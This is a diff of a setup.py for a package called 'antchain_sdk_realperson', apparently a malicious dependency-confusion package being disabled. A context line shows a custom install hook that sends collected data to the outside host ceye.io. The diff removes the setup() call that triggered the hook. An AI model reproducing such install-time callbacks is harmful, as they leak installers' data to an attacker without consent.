@@ -16,10 +16,4 @@ class CustomInstall(install):
         requests.get("http://5r13v9.ceye.io",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-setup(name='antchain_sdk_realperson', #package name
-      version='1.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                           
